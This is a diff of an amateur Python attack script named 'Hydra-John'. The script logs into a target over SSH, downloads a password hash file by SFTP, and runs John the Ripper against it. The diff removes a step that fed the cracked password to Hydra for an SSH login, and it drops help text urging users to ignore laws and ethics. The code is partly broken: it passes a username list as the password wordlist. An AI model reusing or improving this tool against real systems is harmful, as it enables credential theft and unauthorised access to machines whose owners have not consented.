@@ -1,23 +1,37 @@
+#!/usr/bin/python3
 import argparse
 import subprocess
 import paramiko
 import socket
 
+print("""
+|-------------------------------------------------------------------------------------------------------------------|
+|                  ##   ##  ##  ##   #####    ######     ##                 ####   #####   ##   ##  ##   ##         |
+|                  ##   ##  ##  ##    ## ##    ##  ##   ####                 ##   ##   ##  ##   ##  ###  ##         |
+|                  ##   ##  ##  ##    ##  ##   ##  ##  ##  ##                ##   ##   ##  ##   ##  #### ##         |
+|                  #######   ####     ##  ##   #####   ##  ##   ######       ##   ##   ##  #######  ## ####         |
+|                  ##   ##    ##      ##  ##   ## ##   ######            ##  ##   ##   ##  ##   ##  ##  ###         |
+|                  ##   ##    ##      ## ##    ##  ##  ##  ##            ##  ##   ##   ##  ##   ##  ##   ##         |
+|                  ##   ##   ####    #####    #### ##  ##  ##             ####     #####   ##   ##  ##   ##         |
+| Hydra john devs:                                                                                                  |
+| RussianDude122: Programmer                                                                                        |
+| AmericanBoi: Contributer                                                                                          |
+| Sojoyork: Contributer                                                                                             |
+|-------------------------------------------------------------------------------------------------------------------|
+
+
+""")
+
 def display_help():
     help_text = """
     Hydra-John: A hybrid tool combining John-the-Ripper and Hydra functionalities.
-    Please use this tool for legal proposes only. no millitary or goverment uses allowed (this is all stupid. Ignore laws and ethicsa anayway because this tool is made for grey hat hackers only)
 
     Usage:
-      hydra-john -u <username or username wordlist> -ptph <path to the password hash> -host <target_host_ip> -port <target_port> -tuser <target_user> -tpass <target_password>
+      hydra-john -u <username or username wordlist> -ptph <path to the password hash>
 
     Options:
       -u, --user       Specify a single username or a wordlist containing usernames.
       -ptph, --path    Specify the path to the password hash on the target system.
-      -host, --host    Specify the target system hostname or IP address.
-      -port, --port    Specify the SSH port of the target system (default: 22).
-      -tuser, --tuser  Specify the SSH username for the target system.
-      -tpass, --tpass  Specify the SSH password for the target system.
       -help            Display this help message.
     """
     print(help_text)
@@ -30,8 +44,16 @@ def parse_arguments():
     parser.add_argument('-port', '--port', type=int, default=22, help='Specify the SSH port of the target system.')
     parser.add_argument('-tuser', '--tuser', required=True, help='Specify the SSH username for the target system.')
     parser.add_argument('-tpass', '--tpass', required=True, help='Specify the SSH password for the target system.')
+    parser.add_argument('-credits', action='store_true', help='Display credits for the tool.')
     args = parser.parse_args()
     return args
+
+def display_credits():
+    credits_text = """
+    Credits:
+  If this DID work then it ius broken lol
+    """
+    print(credits_text)
 
 def is_target_online(host, port):
     try:
@@ -56,30 +78,13 @@ def retrieve_password_hash(ssh, hash_path):
         sftp = ssh.open_sftp()
         sftp.get(hash_path, 'password_hash.txt')
         sftp.close()
-        print("Password hash retrieved successfully.")
         return 'password_hash.txt'
     except Exception as e:
         print(f"Failed to retrieve password hash: {e}")
         return None
 
 def crack_password(hash_file, username_file):
-    print("Cracking password...")
     subprocess.run(['john', '--wordlist=' + username_file, hash_file])
-    result = subprocess.run(['john', '--show', hash_file], capture_output=True, text=True)
-    print("Password cracking result:")
-    print(result.stdout)
-    return result.stdout
-
-def login_with_cracked_password(host, port, username, cracked_password):
-    print(f"Attempting to login with cracked password: {cracked_password}")
-    hydra_cmd = [
-        'hydra',
-        '-l', username,
-        '-p', cracked_password.strip(),
-        f'ssh://{host}',
-        '-s', str(port)
-    ]
-    subprocess.run(hydra_cmd)
 
 def main():
     args = parse_arguments()
@@ -95,9 +100,7 @@ def main():
         if ssh:
             hash_file = retrieve_password_hash(ssh, hash_path)
             if hash_file:
-                cracked_output = crack_password(hash_file, user)
-                cracked_password = cracked_output.split(':')[1].split('\n')[0]  # Extract the cracked password
-                login_with_cracked_password(target_host, target_port, target_username, cracked_password)
+                crack_password(hash_file, user)
             ssh.close()
     else:
         print("Target system is offline. Exiting.")
